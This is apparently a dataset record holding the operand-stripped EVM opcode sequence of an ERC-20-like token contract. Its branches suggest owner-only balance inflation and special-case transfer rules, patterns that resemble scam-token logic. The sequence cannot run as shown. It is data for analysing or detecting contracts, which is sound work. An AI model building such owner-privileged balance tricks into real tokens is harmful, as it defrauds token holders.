{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST STOP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 JUMP JUMPDEST PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST CALLER PUSH20 AND PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST CALLER PUSH20 AND PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND SUB PUSH2 JUMPI PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 AND PUSH1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH5 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH1 PUSH3 DUP3 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP DUP1 PUSH1 PUSH1 CALLER PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP POP PUSH2 JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 DUP1 CALLER SWAP1 POP PUSH2 DUP6 DUP3 DUP6 PUSH2 JUMP JUMPDEST PUSH2 DUP6 DUP6 DUP6 PUSH2 JUMP JUMPDEST PUSH1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 CALLER DUP9 PUSH2 JUMP JUMPDEST PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 PUSH2 JUMP JUMPDEST JUMP JUMPDEST CALLER PUSH20 AND PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST CALLER PUSH20 AND PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND EQ DUP1 ISZERO PUSH2 JUMPI POP DUP1 PUSH20 AND PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND EQ ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP DUP1 PUSH20 AND PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND EQ ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH20 PUSH20 AND DUP2 PUSH20 AND EQ ISZERO JUMPDEST ISZERO PUSH2 JUMPI PUSH1 PUSH1 PUSH1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD SWAP1 POP PUSH1 DUP2 PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP5 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP POP PUSH2 JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 DUP1 PUSH2 CALLER DUP6 PUSH2 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 CALLER DUP6 DUP6 DUP5 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 JUMP JUMPDEST PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH20 PUSH20 AND PUSH4 PUSH20 ADDRESS PUSH1 MLOAD DUP4 PUSH4 AND PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP3 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 DUP5 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH20 AND DUP4 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 PUSH20 AND DUP3 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP5 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 AND DUP4 PUSH20 AND PUSH32 DUP4 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 PUSH2 DUP5 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH32 DUP2 EQ PUSH2 JUMPI DUP2 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 DUP5 DUP5 DUP5 DUP5 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD SWAP1 POP DUP2 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 PUSH20 AND DUP5 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 PUSH20 AND DUP4 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH20 PUSH20 AND DUP5 PUSH20 AND EQ DUP1 PUSH2 JUMPI POP PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND DUP5 PUSH20 AND EQ JUMPDEST DUP1 PUSH2 JUMPI POP PUSH1 PUSH20 AND PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND EQ JUMPDEST DUP1 PUSH2 JUMPI POP PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP5 PUSH20 AND EQ JUMPDEST ISZERO PUSH2 JUMPI DUP2 PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP2 PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP3 PUSH20 AND DUP5 PUSH20 AND PUSH32 DUP5 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 JUMP JUMPDEST PUSH2 DUP5 PUSH2 JUMP JUMPDEST PUSH2 JUMPI DUP2 PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP2 PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP3 PUSH20 AND DUP5 PUSH20 AND PUSH32 DUP5 PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND PUSH2 PUSH2 JUMP JUMPDEST PUSH20 AND EQ PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 DUP1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP DUP2 PUSH1 DUP1 PUSH2 EXP DUP2 SLOAD DUP2 PUSH20 MUL NOT AND SWAP1 DUP4 PUSH20 AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 AND DUP2 PUSH20 AND PUSH32 PUSH1 MLOAD PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH32 PUSH1 SHL SWAP1 POP PUSH1 DUP4 EXTCODEHASH SWAP1 POP PUSH1 DUP1 SHL DUP2 EQ ISZERO DUP1 ISZERO PUSH2 JUMPI POP DUP2 DUP2 EQ ISZERO JUMPDEST SWAP3 POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP3 DUP3 MSTORE PUSH1 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 DUP2 ADD SWAP1 POP PUSH2 JUMP JUMPDEST PUSH1 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 NOT PUSH1 DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH2 DUP2 DUP6 PUSH2 JUMP JUMPDEST SWAP4 POP PUSH2 DUP2 DUP6 PUSH1 DUP7 ADD PUSH2 JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH1 PUSH20 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 DUP2 CALLDATALOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 DUP2 CALLDATALOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP5 DUP3 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP4 POP POP PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 PUSH1 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP5 DUP3 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 PUSH1 DUP3 DIV SWAP1 POP PUSH1 DUP3 AND DUP1 PUSH2 JUMPI PUSH1 DUP3 AND SWAP2 POP JUMPDEST PUSH1 DUP3 LT DUP2 SUB PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 DUP2 PUSH1 SHR SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP1 DUP3 SWAP2 POP DUP4 SWAP1 POP JUMPDEST PUSH1 DUP6 GT ISZERO PUSH2 JUMPI DUP1 DUP7 DIV DUP2 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 DUP6 AND ISZERO PUSH2 JUMPI DUP1 DUP3 MUL SWAP2 POP JUMPDEST DUP1 DUP2 MUL SWAP1 POP PUSH2 DUP6 PUSH2 JUMP JUMPDEST SWAP5 POP PUSH2 JUMP JUMPDEST SWAP5 POP SWAP5 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP3 PUSH2 JUMPI PUSH1 SWAP1 POP PUSH2 JUMP JUMPDEST DUP2 PUSH2 JUMPI PUSH1 SWAP1 POP PUSH2 JUMP JUMPDEST DUP2 